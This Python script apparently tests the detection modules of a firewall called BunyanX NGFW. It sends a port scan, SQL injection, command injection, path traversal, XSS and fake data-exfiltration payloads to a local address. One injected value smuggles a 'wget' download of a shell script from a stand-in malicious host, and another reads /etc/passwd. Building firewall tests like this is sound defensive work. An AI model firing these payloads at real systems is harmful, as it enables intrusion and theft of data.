#!/usr/bin/env python3
"""
BunyanX NGFW (192.168.1.33) Live Attack & Detection Tester
-----------------------------------------------------------
This script sends real live attack payloads over HTTP/TCP directly to 
the BunyanX NGFW firewall (192.168.1.33:8080) to test all detection 
modules in real-time.

Usage:
    python3 test_ngfw_attacks.py [FIREWALL_IP] [PORT]

Default:
    Target: 192.168.1.33:8080
"""

import sys
import time
import socket
import urllib.request
import urllib.parse
import urllib.error

TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.33"
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
BASE_URL = f"http://{TARGET_IP}:{TARGET_PORT}"

def print_header(title):
    print("\n" + "=" * 60)
    print(f" 🔥 TEST: {title}")
    print("=" * 60)

def send_http_request(description, path, headers=None, data=None, method="GET"):
    url = f"{BASE_URL}{path}"
    headers = headers or {}
    if "User-Agent" not in headers:
        headers["User-Agent"] = "BunyanX-Attack-Tester/1.0"
        
    print(f"\n[+] {description}")
    print(f"    --> {method} {url}")
    
    encoded_data = data.encode('utf-8') if isinstance(data, str) else data
    req = urllib.request.Request(url, data=encoded_data, headers=headers, method=method)
    
    start_time = time.time()
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            latency = (time.time() - start_time) * 1000
            print(f"    [RESPONSE] Status: {response.status} (Allowed) | Time: {latency:.1f}ms")
            return response.status, response.read().decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as e:
        latency = (time.time() - start_time) * 1000
        if e.code in (403, 502, 504):
            print(f"    [BLOCKED 🛑] Status: {e.code} ({e.reason}) | Time: {latency:.1f}ms")
        else:
            print(f"    [RESPONSE] Status: {e.code} ({e.reason}) | Time: {latency:.1f}ms")
        return e.code, e.read().decode('utf-8', errors='ignore') if hasattr(e, 'read') else ""
    except Exception as e:
        latency = (time.time() - start_time) * 1000
        print(f"    [BLOCKED/FAILED 🛑] Connection Error: {e} | Time: {latency:.1f}ms")
        return 0, str(e)

# ── TEST SCENARIOS ─────────────────────────────────────────────────────────────

def test_1_port_scan():
    print_header("1. Real-time Port Scan Detection (CorrelationEngine)")
    print(f"[+] Sending rapid TCP connection probes to {TARGET_IP} across 6 unique ports...")
    test_ports = [80, 8080, 8443, 22, 21, 3306]
    for p in test_ports:
        try:
            print(f"    --> Probing TCP port {p}...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect_ex((TARGET_IP, p))
            s.close()
            time.sleep(0.05)
        except Exception:
            pass
    print("    [✓] Port scan probe sent! (Check Firewall logs for 'ids.port_scan' alert & audio)")

def test_2_sqli_attack():
    print_header("2. WAF SQL Injection Attack (SQLi)")
    send_http_request(
        "SQLi in URL Parameter",
        "/api/users?id=1%20OR%201=1--%20UNION%20SELECT%20username,password%20FROM%20users"
    )
    send_http_request(
        "SQLi in POST Body",
        "/login",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data="username=admin' OR '1'='1' --&password=secret",
        method="POST"
    )

def test_3_rce_command_injection():
    print_header("3. WAF Remote Code Execution (RCE)")
    send_http_request(
        "Command Injection in Query Parameter",
        "/api/ping?host=127.0.0.1;cat%20/etc/passwd;whoami"
    )
    send_http_request(
        "System Command Injection in POST Body",
        "/api/system/diag",
        headers={"Content-Type": "application/json"},
        data='{"ip": "8.8.8.8 | wget http://malicious.com/shell.sh -O /tmp/shell && chmod +x /tmp/shell"}',
        method="POST"
    )

def test_4_path_traversal():
    print_header("4. WAF Local File Inclusion / Path Traversal")
    send_http_request(
        "Path Traversal (/etc/passwd access)",
        "/static/../../../../etc/passwd"
    )

def test_5_xss_attack():
    print_header("5. WAF Cross-Site Scripting (XSS)")
    send_http_request(
        "XSS Payload in Search Query",
        "/search?q=<script>alert('XSS_TEST_PAYLOAD')</script>"
    )

def test_6_dlp_exfiltration():
    print_header("6. DLP Sensitive Data Exfiltration (Credit Cards & Emails)")
    send_http_request(
        "Uploading Credit Card & Email Data",
        "/api/profile/upload",
        headers={"Content-Type": "application/json"},
        data='{"card": "4532015112830366", "email": "admin_exfil@bank_internal.com", "ssn": "000-12-3456"}',
        method="POST"
    )

def test_7_abusive_bot_agent():
    print_header("7. Malicious Bot User-Agent Detection")
    send_http_request(
        "Nmap User-Agent Scanner Probe",
        "/",
        headers={"User-Agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"}
    )

# ── MAIN EXECUTION ─────────────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print(" 🚀 BunyanX Enterprise NGFW - Live Attack Simulation")
    print(f" Target Firewall IP : {TARGET_IP}")
    print(f" Target VIP/Port    : {TARGET_PORT}")
    print("=" * 60)

    test_1_port_scan()
    time.sleep(1)
    test_2_sqli_attack()
    time.sleep(1)
    test_3_rce_command_injection()
    time.sleep(1)
    test_4_path_traversal()
    time.sleep(1)
    test_5_xss_attack()
    time.sleep(1)
    test_6_dlp_exfiltration()
    time.sleep(1)
    test_7_abusive_bot_agent()

    print("\n" + "=" * 60)
    print(" 🏁 Attack Simulation Completed!")
    print(" Check your BunyanX NGFW Web-UI dashboard and Audio alerts.")
    print("=" * 60)

if __name__ == "__main__":
    main()
